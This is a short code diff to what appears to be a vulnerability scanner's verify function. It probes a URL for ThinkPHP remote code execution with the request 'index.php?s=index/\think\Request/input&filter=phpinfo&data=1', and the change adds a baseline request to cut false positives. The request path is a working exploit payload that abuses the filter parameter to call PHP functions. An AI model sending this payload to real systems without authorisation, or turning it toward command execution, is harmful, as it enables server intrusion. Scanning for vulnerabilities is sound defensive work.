@@ -12,8 +12,9 @@ def verify(url):
     }
     try:
         vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\Request/input&filter=phpinfo&data=1')
-        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
-        if r"PHP Version" in req.text:
+        req = requests.get(vurl, headers=headers, timeout=3, verify=False)
+        req2 = requests.get(url, headers=headers, timeout=3, verify=False)
+        if r"PHP Version" in req.text and r"PHP Version" not in req2.text:
             relsult['vulnerable'] = True
             relsult['method'] = 'GET'
             relsult['url'] = url
